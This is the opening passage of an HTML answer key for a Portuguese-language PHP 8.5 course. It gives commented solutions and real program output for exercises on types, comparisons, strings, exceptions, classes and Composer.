@@ -1,0 +1,2428 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Dominando o PHP · Caderno de Respostas</title>
+<link rel="stylesheet" href="../caderno.css">
+</head>
+<body class="caderno respostas">
+<header class="capa">
+<p class="serie">DOMINANDO O PHP</p>
+<h1>Caderno de Respostas</h1>
+<p class="subtitulo">Gabarito comentado: 52 aulas de prática, do #01 ao #52</p>
+<p class="subtitulo">PHP 8.5 · Composer · 10 módulos · 71 questões · 2 desafios integradores</p>
+<p class="autoria">Autor Desconhecido · <a href="https://theknowledgeisle.com/">theknowledgeisle.com</a></p>
+</header>
+<aside class="nota">
+<p><strong>Consulte este gabarito só depois de tentar.</strong></p>
+<p>As respostas são comentadas para ensinar, não só para conferir. Nos exercícios de código existem outras soluções igualmente válidas: o que importa é entender por que a sua funciona e o que ela troca em relação à mostrada aqui.</p>
+<p>Os programas com um quadro verde de <strong>Saída</strong> foram executados com o PHP 8.5 (CLI) no Linux, e a saída mostrada é a real.</p>
+</aside>
+<h2 class="sumario-titulo">Sumário</h2>
+<table class="sumario">
+<thead><tr><th>Módulo</th><th>Tema</th><th>Aulas</th><th>Questões</th></tr></thead>
+<tbody>
+<tr><td>MÓDULO 1</td><td>Fundamentos da linguagem</td><td>#01–#10</td><td>Q1–Q12</td></tr>
+<tr><td>MÓDULO 2</td><td>Orientação a objetos e padrões de projeto</td><td>#11–#15</td><td>Q13–Q20</td></tr>
+<tr><td>MÓDULO 3</td><td>PHP moderno: exceções, interfaces e traits avançados e o PHP 8.x</td><td>#16–#19</td><td>Q21–Q27</td></tr>
+<tr><td>MÓDULO 4</td><td>Banco de dados, APIs e testes</td><td>#20–#25</td><td>Q28–Q37</td></tr>
+<tr><td>MÓDULO 5</td><td>Arquitetura e escala</td><td>#26–#30</td><td>Q38–Q44</td></tr>
+<tr><td>MÓDULO 6</td><td>Outros bancos: PostgreSQL, SQLite e MongoDB</td><td>#31–#33</td><td>Q45–Q49</td></tr>
+<tr><td>MÓDULO 7</td><td>A web: formulários, sessões e segurança</td><td>#34–#40</td><td>Q50–Q56</td></tr>
+<tr><td>MÓDULO 8</td><td>Laravel</td><td>#41–#45</td><td>Q57–Q61</td></tr>
+<tr><td>MÓDULO 9</td><td>Segurança avançada, testes e produção</td><td>#46–#49</td><td>Q62–Q68</td></tr>
+<tr><td>MÓDULO 10</td><td>Projeto final</td><td>#50–#52</td><td>Q69–Q71</td></tr>
+<tr><td>DESAFIOS</td><td>Desafios integradores</td><td>todas</td><td>D1–D2</td></tr>
+</tbody>
+</table>
+<section class="modulo" id="modulo-1">
+<h2><span class="rotulo">MÓDULO 1</span> Fundamentos da linguagem</h2>
+<p class="intro">O que é o PHP e de onde veio, o ambiente, variáveis e tipos, decisões, laços, funções, arrays, strings e o tratamento de erros.</p>
+<p class="aulas-titulo">Artigos 01 a 10</p>
+<ul class="aulas">
+<li><span class="n">#01</span> O que é PHP e por que ele ainda importa</li>
+<li><span class="n">#02</span> A História do PHP: de script pessoal a pilar da web</li>
+<li><span class="n">#03</span> Configurando o Ambiente de Desenvolvimento</li>
+<li><span class="n">#04</span> Variáveis, Tipos de Dados e Operadores</li>
+<li><span class="n">#05</span> Estruturas de Controle</li>
+<li><span class="n">#06</span> Estruturas de Repetição</li>
+<li><span class="n">#07</span> Funções</li>
+<li><span class="n">#08</span> Arrays em Profundidade</li>
+<li><span class="n">#09</span> Strings em Profundidade</li>
+<li><span class="n">#10</span> Tratamento de Erros e Exceções</li>
+</ul>
+<h3>Perguntas conceituais — respostas</h3>
+<div class="questao" id="q1">
+<span class="num">Q1</span>
+<div class="corpo">
+<p class="titulo">O ciclo de uma requisição</p>
+<p>Descreva o que acontece entre o navegador pedir <code>/produtos.php</code> e receber o HTML. Por que se diz que o PHP tem um modelo "<em>shared nothing</em>", e que consequência isso tem para variáveis globais?</p>
+</div>
+</div>
+<p>O servidor web (Apache, ou nginx com PHP-FPM) recebe a requisição, entrega o script ao interpretador, que compila o código para <em>opcodes</em> (o OPcache guarda essa compilação entre requisições), executa, e o que o script imprime vira o corpo da resposta. Ao fim da requisição, <strong>tudo</strong> é descartado: variáveis, objetos, conexões não persistentes. A requisição seguinte começa do zero, sem compartilhar nada com a anterior. A consequência: uma variável global ou estática não guarda nada entre visitas. Para lembrar algo, é preciso sessão, <em>cookie</em>, banco ou cache. A vantagem é o isolamento: um erro numa requisição não contamina as outras, e escalar é só acrescentar processos.</p>
+<div class="questao" id="q2">
+<span class="num">Q2</span>
+<div class="corpo">
+<p class="titulo">Comparação fraca e estrita</p>
+<p>Qual o resultado de cada comparação no PHP 8, e por que o <code>===</code> é o padrão recomendado? <code>0 == "a"</code>, <code>"1" == "01"</code>, <code>"abc" == 0</code>, <code>null == false</code>, <code>"1e3" == "1000"</code>.</p>
+</div>
+</div>
+<ul><li><code>0 == "a"</code>: <strong>false</strong> no PHP 8 (era <code>true</code> no PHP 7, quando a string virava 0). Hoje, comparar número com string não numérica compara como strings.</li><li><code>"1" == "01"</code>: <strong>true</strong>: duas strings numéricas são comparadas como números.</li><li><code>"abc" == 0</code>: <strong>false</strong>, pela mesma regra do primeiro caso.</li><li><code>null == false</code>: <strong>true</strong>: os dois viram <code>false</code>.</li><li><code>"1e3" == "1000"</code>: <strong>true</strong>: "1e3" é uma string numérica (notação científica) e vale 1000.</li></ul>
+<p>O <code>===</code> compara <strong>valor e tipo</strong>, sem conversão: o resultado é previsível sem decorar tabela nenhuma. O <code>==</code> ainda tem casos surpreendentes, como o último, que já causou falhas de segurança em comparações de <em>hashes</em> ("0e123" == "0e456" é <code>true</code>). Para senhas e <em>tokens</em>, nem <code>===</code>: use <code>hash_equals</code>, que leva o mesmo tempo qualquer que seja a diferença.</p>
+<div class="questao" id="q3">
+<span class="num">Q3</span>
+<div class="corpo">
+<p class="titulo">declare(strict_types=1)</p>
+<p>O que muda num arquivo com <code>declare(strict_types=1);</code> na chamada <code>somar("5", 3)</code> de uma função <code>function somar(int $a, int $b): int</code>? O efeito vale para o arquivo onde a função foi declarada ou onde foi chamada?</p>
+</div>
+</div>
+<p>Sem <code>strict_types</code>, o PHP <strong>converte</strong> "5" para 5 (modo coercitivo) e a chamada funciona; uma string como "5 maçãs" lança <code>TypeError</code>. Com <code>strict_types=1</code>, qualquer tipo diferente do declarado lança <code>TypeError</code>, exceto <code>int</code> passado onde se espera <code>float</code>, que continua permitido. O efeito vale <strong>no arquivo onde a chamada acontece</strong>: é quem chama que escolhe o modo. Por isso a declaração vai no topo de todo arquivo do projeto, e é comum exigi-la num <em>linter</em>.</p>
+<div class="questao" id="q4">
+<span class="num">Q4</span>
+<div class="corpo">
+<p class="titulo">Arrays: lista ou mapa</p>
+<p>O <code>array</code> do PHP serve de lista, mapa, pilha e fila. O que <code>array_is_list()</code> verifica, e por que <code>unset($lista[1])</code> seguido de <code>json_encode($lista)</code> costuma surpreender?</p>
+</div>
+</div>
+<p>Por dentro, todo <code>array</code> do PHP é um <strong>mapa ordenado</strong> (chave → valor, lembrando a ordem de inserção). Uma "lista" é só um array cujas chaves são 0, 1, 2… em sequência, e é isso que <code>array_is_list()</code> (PHP 8.1) verifica. O <code>unset($lista[1])</code> remove o elemento <strong>e a chave</strong>, sem renumerar: sobram as chaves 0 e 2. O <code>json_encode</code> então não pode gerar um array JSON (que não tem chaves) e gera um <strong>objeto</strong>: <code>{"0":"a","2":"c"}</code>. Um cliente JavaScript que esperava <code>["a","c"]</code> quebra. A correção é renumerar com <code>array_values($lista)</code>, ou filtrar com <code>array_filter</code> seguido de <code>array_values</code>.</p>
+<div class="questao" id="q5">
+<span class="num">Q5</span>
+<div class="corpo">
+<p class="titulo">strlen ou mb_strlen</p>
+<p>Por que <code>strlen("ação")</code> devolve 6, e <code>mb_strlen("ação")</code> devolve 4? Que outras funções têm a mesma armadilha?</p>
+</div>
+</div>
+<p>As funções clássicas de string do PHP (<code>strlen</code>, <code>substr</code>, <code>strtoupper</code>, <code>str_pad</code>, <code>strrev</code>, <code>ucfirst</code>) trabalham com <strong>bytes</strong>. Em UTF-8, "ç" e "ã" ocupam dois bytes cada: 4 letras, 6 bytes. As funções <code>mb_*</code> (<code>mb_strlen</code>, <code>mb_substr</code>, <code>mb_strtoupper</code>, <code>mb_str_pad</code> no PHP 8.3) entendem a codificação e trabalham com caracteres. Cortar com <code>substr</code> no meio de um caractere de dois bytes produz um texto inválido, que aparece como "�". Regra: para texto em português, use as <code>mb_*</code> sempre que o tamanho ou a posição importarem.</p>
+<div class="questao" id="q6">
+<span class="num">Q6</span>
+<div class="corpo">
+<p class="titulo">Exception, Error e Throwable</p>
+<p>No PHP 8, qual a diferença entre <code>Exception</code> e <code>Error</code>? Por que <code>catch (Exception $e)</code> não captura uma divisão por zero ou um <code>TypeError</code>?</p>
+</div>
+</div>
+<p>As duas implementam a interface <code>Throwable</code>, mas são hierarquias separadas. <code>Exception</code> é para <strong>condições de erro da aplicação</strong> que o código pode prever e tratar (arquivo não encontrado, validação). <code>Error</code> representa <strong>erros do motor</strong>, geralmente bugs: <code>TypeError</code>, <code>ValueError</code>, <code>DivisionByZeroError</code>, chamada a método inexistente. Como <code>Error</code> não herda de <code>Exception</code>, um <code>catch (Exception $e)</code> não o captura. Isso é proposital: bugs não devem ser engolidos por um tratamento genérico. Para um registro de último nível (o <em>handler</em> que grava o log e mostra a página de erro 500), captura-se <code>Throwable</code>.</p>
+<h3>Exercícios de código — respostas</h3>
+<div class="questao" id="q7">
+<span class="num">Q7</span>
+<div class="corpo">
+<p class="titulo">Tabela de tipos</p>
+<p>Escreva um programa que percorra os valores <code>0</code>, <code>"0"</code>, <code>""</code>, <code>"0.0"</code>, <code>[]</code>, <code>null</code>, <code>"false"</code> e <code>0.0</code> e mostre, para cada um, o tipo (<code>get_debug_type</code>), se é "verdadeiro" num <code>if</code> e se <code>empty()</code> o considera vazio. Qual deles surpreende?</p>
+</div>
+</div>
+<pre class="codigo"><code>&lt;?php
+declare(strict_types=1);
+
+$valores = [0, "0", "", "0.0", [], null, "false", 0.0];
+printf("%-9s %-7s %-6s %s\n", "valor", "tipo", "if", "empty");
+foreach ($valores as $v) {
+    printf(
+        "%-9s %-7s %-6s %s\n",
+        json_encode($v),
+        get_debug_type($v),
+        $v ? "true" : "false",
+        empty($v) ? "sim" : "não",
+    );
+}</code></pre>
+<pre class="saida"><code>valor     tipo    if     empty
+0         int     false  sim
+"0"       string  false  sim
+""        string  false  sim
+"0.0"     string  true   não
+[]        array   false  sim
+null      null    false  sim
+"false"   string  true   não
+0         float   false  sim</code></pre>
+<p>A surpresa é a string <code>"0"</code>: é <strong>falsa</strong>, enquanto <code>"0.0"</code> e <code>"false"</code> são verdadeiras. O PHP trata <code>"0"</code> como falsa por herança dos formulários, onde todo valor chega como texto. Por isso <code>if ($quantidade)</code> falha quando o usuário digita 0, e <code>empty($_POST['qtd'])</code> também. Para checar se um campo veio, use <code>isset</code> ou <code>array_key_exists</code>; para comparar, <code>=== ""</code> ou <code>=== null</code>.</p>
+<div class="questao" id="q8">
+<span class="num">Q8</span>
+<div class="corpo">
+<p class="titulo">match no lugar de switch</p>
+<p>Reescreva com <code>match</code> uma função que classifica o código HTTP: 200 a 299 "sucesso", 301, 302 e 307 "redirecionamento", 404 "não encontrado", 400 a 499 "erro do cliente", 500 a 599 "erro do servidor". Mostre o que acontece com o código 99.</p>
+</div>
+</div>
+<pre class="codigo"><code>&lt;?php
+declare(strict_types=1);
+
+function classificar(int $codigo): string
+{
+    return match (true) {
+        $codigo &gt;= 200 &amp;&amp; $codigo &lt;= 299 =&gt; "sucesso",
+        in_array($codigo, [301, 302, 307], true) =&gt; "redirecionamento",
+        $codigo === 404 =&gt; "não encontrado",
+        $codigo &gt;= 400 &amp;&amp; $codigo &lt;= 499 =&gt; "erro do cliente",
+        $codigo &gt;= 500 &amp;&amp; $codigo &lt;= 599 =&gt; "erro do servidor",
+    };
+}
+
+foreach ([200, 302, 404, 422, 503, 99] as $c) {
+    try {
+        echo "$c: ", classificar($c), "\n";
+    } catch (\UnhandledMatchError $e) {
+        echo "$c: ", $e-&gt;getMessage(), "\n";
+    }
+}</code></pre>
+<pre class="saida"><code>200: sucesso
+302: redirecionamento
+404: não encontrado
+422: erro do cliente
+503: erro do servidor
+99: 99: Unhandled match case of type bool</code></pre>
+<p>O <code>match</code> compara com <code>===</code> (sem conversões), devolve um valor e <strong>não tem fall-through</strong>: não existe <code>break</code> para esquecer. Quando nenhum braço casa, ele lança <code>UnhandledMatchError</code>, em vez de seguir em silêncio como o <code>switch</code> sem <code>default</code>. A mensagem fala em "<em>of type bool</em>" porque o valor comparado é o <code>true</code> do <code>match (true)</code>, e não o código. O <code>match (true)</code> é o idioma para faixas: cada braço é uma condição, e vence a primeira verdadeira, por isso o 404 vem antes da faixa 400–499.</p>
+<div class="questao" id="q9">
+<span class="num">Q9</span>
+<div class="corpo">
+<p class="titulo">Funções com tipos, padrões e argumentos nomeados</p>
+<p>Escreva <code>function formatarPreco(float $valor, string $moeda = "R$", int $casas = 2, bool $milhar = true): string</code> com <code>number_format</code> no padrão brasileiro. Chame-a com argumentos nomeados, pulando parâmetros. Depois escreva uma função variádica <code>somarTodos(int ...$numeros): int</code> e chame-a espalhando um array.</p>
+</div>
+</div>
+<pre class="codigo"><code>&lt;?php
+declare(strict_types=1);
+
+function formatarPreco(float $valor, string $moeda = "R$", int $casas = 2, bool $milhar = true): string
+{
+    return $moeda . " " . number_format($valor, $casas, ",", $milhar ? "." : "");
+}
+
+function somarTodos(int ...$numeros): int
+{
+    return array_sum($numeros);
+}
+
+echo formatarPreco(1234.5), "\n";
+echo formatarPreco(1234.5, milhar: false), "\n";
+echo formatarPreco(99.999, casas: 0, moeda: "US$"), "\n";
+
+$itens = [10, 20, 30];
+echo somarTodos(...$itens), " | ", somarTodos(), "\n";</code></pre>
+<pre class="saida"><code>R$ 1.234,50
+R$ 1234,50
+US$ 100
+60 | 0</code></pre>
+<p>Os argumentos nomeados (PHP 8.0) permitem pular parâmetros com padrão e deixam a chamada legível: <code>milhar: false</code> diz o que faz, enquanto <code>formatarPreco(1234.5, "R$", 2, false)</code> obriga a consultar a assinatura. A contrapartida é que o nome do parâmetro passa a fazer parte da API: renomeá-lo quebra quem chama. O <code>number_format</code> arredonda (99,999 vira 100); para dinheiro de verdade, os valores devem ficar em centavos inteiros ou em <code>bcmath</code>, nunca em <code>float</code>.</p>
+<div class="questao" id="q10">
+<span class="num">Q10</span>
+<div class="corpo">
+<p class="titulo">Manipulando arrays sem laços</p>
+<p>Dado um array de pedidos (<code>cliente</code>, <code>valor</code>, <code>status</code>), use <code>array_filter</code>, <code>array_map</code>, <code>array_column</code>, <code>array_sum</code> e <code>usort</code> para: (a) os pedidos pagos; (b) o total pago; (c) os nomes dos clientes com pedido pago, sem repetição e em ordem alfabética; (d) os pedidos ordenados por valor decrescente. Use o operador pipe <code>|&gt;</code> do PHP 8.5 em um dos casos.</p>
+</div>
+</div>
+<pre class="codigo"><code>&lt;?php
+declare(strict_types=1);
+
+$pedidos = [
+    ["cliente" =&gt; "Carla", "valor" =&gt; 120.0, "status" =&gt; "pago"],
+    ["cliente" =&gt; "Ana", "valor" =&gt; 80.0, "status" =&gt; "pendente"],
+    ["cliente" =&gt; "Bruno", "valor" =&gt; 200.0, "status" =&gt; "pago"],
+    ["cliente" =&gt; "Ana", "valor" =&gt; 45.5, "status" =&gt; "pago"],
+];
+
+$pagos = array_filter($pedidos, fn(array $p): bool =&gt; $p["status"] === "pago");
+echo "(a) ", count($pagos), " pedidos pagos\n";
+echo "(b) total pago: ", array_sum(array_column($pagos, "valor")), "\n";
+
+$nomes = $pagos
+    |&gt; (fn($ps) =&gt; array_column($ps, "cliente"))
+    |&gt; array_unique(...)
+    |&gt; (function (array $n): array { sort($n); return $n; });
+echo "(c) ", implode(", ", $nomes), "\n";
+
+$ordenados = $pedidos;
+usort($ordenados, fn(array $a, array $b): int =&gt; $b["valor"] &lt;=&gt; $a["valor"]);
+echo "(d) ", implode(" &gt; ", array_map(fn($p) =&gt; "{$p['cliente']} {$p['valor']}", $ordenados)), "\n";</code></pre>
+<pre class="saida"><code>(a) 3 pedidos pagos
+(b) total pago: 365.5
+(c) Ana, Bruno, Carla
+(d) Bruno 200 &gt; Carla 120 &gt; Ana 80 &gt; Ana 45.5</code></pre>
+<p>O <code>array_filter</code> <strong>preserva as chaves</strong>: <code>$pagos</code> tem as chaves 0, 2 e 3, o que não atrapalha aqui, mas atrapalharia um <code>json_encode</code> (veja a pergunta sobre listas). O pipe <code>|&gt;</code> passa o resultado da esquerda como único argumento da direita: lê de cima para baixo, na ordem em que as coisas acontecem, em vez de <code>sort(array_unique(array_column(...)))</code> de dentro para fora. O <code>sort</code> altera o array por referência e devolve <code>bool</code>, por isso precisa da função anônima. O <code>&lt;=&gt;</code> (nave espacial) devolve -1, 0 ou 1, exatamente o que o <code>usort</code> espera.</p>
+<div class="questao" id="q11">
+<span class="num">Q11</span>
+<div class="corpo">
+<p class="titulo">Strings com acentos</p>
+<p>Escreva <code>function slug(string $texto): string</code> que transforme "Ação &amp; Reação: o Básico do PHP!" em <code>acao-reacao-o-basico-do-php</code>, removendo acentos com <code>iconv</code> ou com a extensão <code>intl</code>, trocando o que não é letra ou dígito por hífen e eliminando hífens repetidos e nas pontas. Mostre também a diferença entre <code>strtoupper</code> e <code>mb_strtoupper</code> no mesmo texto.</p>
+</div>
+</div>
+<pre class="codigo"><code>&lt;?php
+declare(strict_types=1);
+
+function slug(string $texto): string
+{
+    $semAcento = transliterator_transliterate("Any-Latin; Latin-ASCII; Lower()", $texto);
+    $slug = preg_replace("/[^a-z0-9]+/", "-", $semAcento);
+    return trim($slug, "-");
+}
+
+$titulo = "Ação &amp; Reação: o Básico do PHP!";
+echo slug($titulo), "\n";
+echo slug("  Coração   São João  "), "\n";
+echo "strtoupper:    ", strtoupper("ação"), "\n";
+echo "mb_strtoupper: ", mb_strtoupper("ação"), "\n";
+echo "strlen: ", strlen("ação"), " | mb_strlen: ", mb_strlen("ação"), "\n";</code></pre>
+<pre class="saida"><code>acao-reacao-o-basico-do-php
+coracao-sao-joao
+strtoupper:    AçãO
+mb_strtoupper: AÇÃO
+strlen: 6 | mb_strlen: 4</code></pre>
+<p>O <code>transliterator_transliterate</code> (extensão <code>intl</code>) converte qualquer escrita para ASCII de forma confiável; o <code>iconv("UTF-8", "ASCII//TRANSLIT", ...)</code> também funciona, mas o resultado depende da biblioteca C e do <em>locale</em> do servidor. O <code>strtoupper</code>, desde o PHP 8.2, só converte letras ASCII e deixa os bytes de "ç" e "ã" intactos, por isso sai "AçãO". É o mesmo tipo de função que gera os <em>slugs</em> das URLs deste site.</p>
+<div class="questao" id="q12">
+<span class="num">Q12</span>
+<div class="corpo">
+<p class="titulo">Exceções em camadas</p>
+<p>Escreva uma função <code>lerConfiguracao(string $arquivo): array</code> que lance uma exceção própria <code>ConfiguracaoException</code> quando o arquivo não existe ou o JSON é inválido, encadeando a exceção original (<code>previous</code>). Use <code>json_decode</code> com <code>JSON_THROW_ON_ERROR</code>. No código que chama, mostre a mensagem e a causa, e use <code>finally</code>.</p>
+</div>
+</div>
+<pre class="codigo"><code>&lt;?php
+declare(strict_types=1);
+
+final class ConfiguracaoException extends RuntimeException {}
+
+function lerConfiguracao(string $arquivo): array
+{
+    if (!is_file($arquivo)) {
+        throw new ConfiguracaoException("arquivo de configuração não encontrado: $arquivo");
+    }
+    try {
+        return json_decode(file_get_contents($arquivo), true, flags: JSON_THROW_ON_ERROR);
+    } catch (JsonException $e) {
+        throw new ConfiguracaoException("configuração inválida em $arquivo", previous: $e);
+    }
+}
+
+file_put_contents("ok.json", '{"site": "Livraria", "itensPorPagina": 12}');
+file_put_contents("quebrado.json", '{"site": "Livraria",');
+
+foreach (["ok.json", "quebrado.json", "nao-existe.json"] as $arq) {
+    try {
+        $cfg = lerConfiguracao($arq);
+        echo "$arq: {$cfg['site']}, {$cfg['itensPorPagina']} por página\n";
+    } catch (ConfiguracaoException $e) {
+        echo "$arq: {$e-&gt;getMessage()}";
+        echo $e-&gt;getPrevious() ? " (causa: {$e-&gt;getPrevious()-&gt;getMessage()})\n" : "\n";
+    } finally {
+        echo "  -&gt; verificado\n";
+    }
+}</code></pre>
+<pre class="saida"><code>ok.json: Livraria, 12 por página
+  -&gt; verificado
+quebrado.json: configuração inválida em quebrado.json (causa: Syntax error)
+  -&gt; verificado
+nao-existe.json: arquivo de configuração não encontrado: nao-existe.json
+  -&gt; verificado</code></pre>
+<p>O <code>JSON_THROW_ON_ERROR</code> (PHP 7.3) faz o <code>json_decode</code> lançar em vez de devolver <code>null</code> em silêncio, o que eliminava a dúvida entre "o JSON era <code>null</code>" e "o JSON estava quebrado". Encadear com <code>previous</code> preserva a causa técnica para o log, enquanto a mensagem da exceção própria fala a língua de quem chama.</p>
+</section>
+<section class="modulo" id="modulo-2">
+<h2><span class="rotulo">MÓDULO 2</span> Orientação a objetos e padrões de projeto</h2>
+<p class="intro">Classes e objetos, herança, interfaces e traits, namespaces, PSR-4 e Composer, e os padrões Singleton, Factory, Builder, Observer, Decorator e Strategy.</p>
+<p class="aulas-titulo">Artigos 11 a 15</p>
+<ul class="aulas">
+<li><span class="n">#11</span> Orientação a Objetos: Fundamentos</li>
+<li><span class="n">#12</span> Herança, Interfaces e Traits</li>
+<li><span class="n">#13</span> Namespaces, Autoloading, PSR-4 e Composer</li>
+<li><span class="n">#14</span> Design Patterns: Singleton, Factory e Builder</li>
+<li><span class="n">#15</span> Observer, Decorator e Strategy</li>
+</ul>
+<h3>Perguntas conceituais — respostas</h3>
+<div class="questao" id="q13">
+<span class="num">Q13</span>
+<div class="corpo">
+<p class="titulo">Visibilidade e encapsulamento</p>
+<p>Qual a diferença entre <code>public</code>, <code>protected</code> e <code>private</code>? Por que expor uma propriedade <code>public float $saldo</code> numa classe <code>Conta</code> é um problema, e como o PHP 8.4 resolve isso com visibilidade assimétrica?</p>
+</div>
+</div>
+<p><code>public</code> é acessível de qualquer lugar; <code>protected</code>, da própria classe e das filhas; <code>private</code>, só da própria classe. Com <code>public float $saldo</code>, qualquer linha do sistema pode fazer <code>$conta-&gt;saldo = -1000</code>, sem passar pelas regras de saque e depósito: a classe não consegue proteger a própria invariante. A solução clássica é <code>private</code> com um <em>getter</em>. O PHP 8.4 permite declarar a leitura e a escrita com visibilidades diferentes: <code>public private(set) float $saldo</code>. Todos leem <code>$conta-&gt;saldo</code> direto, sem <em>getter</em>, mas só a própria classe altera.</p>
+<div class="questao" id="q14">
+<span class="num">Q14</span>
+<div class="corpo">
+<p class="titulo">Herança, interface ou trait</p>
+<p>Para cada caso, escolha entre herança, interface e trait: (a) várias classes de pagamento (Pix, cartão, boleto) que precisam de um método <code>pagar()</code>, com implementações totalmente diferentes; (b) as classes <code>Produto</code>, <code>Pedido</code> e <code>Cliente</code>, que precisam dos mesmos métodos <code>criadoEm()</code> e <code>atualizadoEm()</code> com o mesmo código; (c) <code>Administrador</code>, que é um <code>Usuario</code> com permissões a mais.</p>
+</div>
+</div>
+<ul><li>(a) <strong>Interface</strong> <code>MeioDePagamento</code>: o que se compartilha é o <strong>contrato</strong>, não o código.</li><li>(b) <strong>Trait</strong> <code>TemTimestamps</code>: é <strong>código</strong> idêntico em classes sem relação "é um" entre si. A trait é colada na classe pelo compilador, como um "copiar e colar" com verificação.</li><li>(c) <strong>Herança</strong>: o administrador <strong>é</strong> um usuário, e herda estado e comportamento.</li></ul>
+<p>A regra prática é preferir composição e interfaces, e usar herança só quando a relação "é um" for verdadeira e estável. Traits são cômodas, mas escondem dependências: uma trait que usa <code>$this-&gt;id</code> só funciona em classes que têm esse <code>id</code>.</p>
+<div class="questao" id="q15">
+<span class="num">Q15</span>
+<div class="corpo">
+<p class="titulo">O que o Composer resolve</p>
+<p>O que fazem o <code>composer.json</code>, o <code>composer.lock</code> e o <code>vendor/autoload.php</code>? Por que o <code>composer.lock</code> vai para o repositório de uma aplicação, e o <code>vendor/</code> não?</p>
+</div>
+</div>
+<ul><li><code>composer.json</code>: declara as dependências e as <strong>faixas de versão</strong> aceitas (<code>"monolog/monolog": "^3.0"</code>), além do mapa de <em>autoload</em> (PSR-4).</li><li><code>composer.lock</code>: registra as versões <strong>exatas</strong> instaladas, com os <em>hashes</em>. O <code>composer install</code> instala exatamente o que está nele; o <code>composer update</code> recalcula as versões dentro das faixas e o reescreve.</li><li><code>vendor/autoload.php</code>: o <em>autoloader</em> gerado, que carrega cada classe sob demanda a partir do <em>namespace</em>, sem nenhum <code>require</code> manual.</li></ul>
+<p>O <code>.lock</code> é versionado para que todos (os colegas, o CI e a produção) instalem <strong>as mesmas</strong> versões. O <code>vendor/</code> não é versionado porque é reproduzível a partir do <code>.lock</code> (<code>composer install</code>), é grande e muda a cada atualização.</p>
+<div class="questao" id="q16">
+<span class="num">Q16</span>
+<div class="corpo">
+<p class="titulo">Singleton: quando não usar</p>
+<p>O Singleton garante uma única instância de uma classe, como a conexão com o banco. Por que ele é considerado um antipadrão na maioria dos casos, e qual a alternativa?</p>
+</div>
+</div>
+<p>O Singleton é um <strong>estado global disfarçado</strong>: qualquer código pode chamar <code>Banco::instancia()</code> de qualquer lugar, então as dependências de uma classe ficam escondidas dentro dos métodos dela, e não visíveis no construtor. Isso dificulta os testes (não dá para trocar o banco por um falso sem truques), acopla o código à classe concreta e mantém estado entre testes que deveriam ser independentes. A alternativa é a <strong>injeção de dependência</strong>: a classe recebe o <code>PDO</code> pelo construtor, e um contêiner (ou o próprio <code>index.php</code>) cria uma instância só e a repassa. "Uma instância só" vira uma decisão de configuração, e não uma regra imposta pela classe.</p>
+<h3>Exercícios de código — respostas</h3>
+<div class="questao" id="q17">
+<span class="num">Q17</span>
+<div class="corpo">
+<p class="titulo">Uma conta com regras</p>
+<p>Escreva <code>final class Conta</code> com o titular, o saldo (<code>public private(set)</code>, PHP 8.4) e os métodos <code>depositar</code> e <code>sacar</code>, que recusam valores não positivos e saques acima do saldo com exceções. Trabalhe em centavos (<code>int</code>). Mostre que tentar alterar o saldo de fora causa um <code>Error</code>.</p>
+</div>
+</div>
+<pre class="codigo"><code>&lt;?php
+declare(strict_types=1);
+
+final class Conta
+{
+    public private(set) int $saldoCentavos = 0;
+
+    public function __construct(public readonly string $titular) {}
+
+    public function depositar(int $centavos): void
+    {
+        if ($centavos &lt;= 0) {
+            throw new InvalidArgumentException("depósito deve ser positivo");
+        }
+        $this-&gt;saldoCentavos += $centavos;
+    }
+
+    public function sacar(int $centavos): void
+    {
+        if ($centavos &lt;= 0) {
+            throw new InvalidArgumentException("saque deve ser positivo");
+        }
+        if ($centavos &gt; $this-&gt;saldoCentavos) {
+            throw new DomainException("saldo insuficiente");
+        }
+        $this-&gt;saldoCentavos -= $centavos;
+    }
+}
+
+$c = new Conta("Ana");
+$c-&gt;depositar(10_000);
+$c-&gt;sacar(2_550);
+printf("%s tem R$ %s\n", $c-&gt;titular, number_format($c-&gt;saldoCentavos / 100, 2, ",", "."));
+
+foreach ([fn() =&gt; $c-&gt;sacar(100_000), fn() =&gt; $c-&gt;depositar(-5), fn() =&gt; $c-&gt;saldoCentavos = 1] as $tentativa) {
+    try {
+        $tentativa();
+    } catch (Throwable $e) {
+        echo get_class($e), ": ", $e-&gt;getMessage(), "\n";
+    }
+}</code></pre>
+<pre class="saida"><code>Ana tem R$ 74,50
+DomainException: saldo insuficiente
+InvalidArgumentException: depósito deve ser positivo
+Error: Cannot modify private(set) property Conta::$saldoCentavos from global scope</code></pre>
+<p>O <code>DomainException</code> (regra de negócio) e o <code>InvalidArgumentException</code> (argumento inválido) permitem a quem chama tratar os dois casos de forma diferente. O <code>Error</code> da terceira tentativa é o motor do PHP recusando a escrita: não há como o código de fora contornar a regra. A promoção de propriedade no construtor (<code>public readonly string $titular</code>) declara e atribui numa linha só.</p>
+<div class="questao" id="q18">
+<span class="num">Q18</span>
+<div class="corpo">
+<p class="titulo">Interfaces e um padrão Strategy</p>
+<p>Defina <code>interface CalculoFrete { public function calcular(float $pesoKg, string $uf): float; }</code> e três estratégias: <code>FreteFixo</code>, <code>FretePorPeso</code> (R$ 5 por kg, mínimo R$ 12) e <code>FreteGratisAcimaDe</code> (um <em>decorator</em> que recebe outra estratégia e zera o frete quando o valor do pedido passa de um limite). Calcule o frete de dois pedidos com cada uma.</p>
+</div>
+</div>
+<pre class="codigo"><code>&lt;?php
+declare(strict_types=1);
+
+interface CalculoFrete
+{
+    public function calcular(float $pesoKg, string $uf, float $valorPedido): float;
+}
+
+final class FreteFixo implements CalculoFrete
+{
+    public function __construct(private float $valor) {}
+    public function calcular(float $pesoKg, string $uf, float $valorPedido): float
+    {
+        return $this-&gt;valor;
+    }
+}
+
+final class FretePorPeso implements CalculoFrete
+{
+    public function calcular(float $pesoKg, string $uf, float $valorPedido): float
+    {
+        return max(12.0, 5.0 * $pesoKg);
+    }
+}
+
+final class FreteGratisAcimaDe implements CalculoFrete
+{
+    public function __construct(private CalculoFrete $base, private float $limite) {}
+    public function calcular(float $pesoKg, string $uf, float $valorPedido): float
+    {
+        return $valorPedido &gt; $this-&gt;limite ? 0.0 : $this-&gt;base-&gt;calcular($pesoKg, $uf, $valorPedido);
+    }
+}
+
+$estrategias = [
+    "fixo" =&gt; new FreteFixo(15.0),
+    "por peso" =&gt; new FretePorPeso(),
+    "grátis acima de 200 (sobre por peso)" =&gt; new FreteGratisAcimaDe(new FretePorPeso(), 200.0),
+];
+foreach ($estrategias as $nome =&gt; $e) {
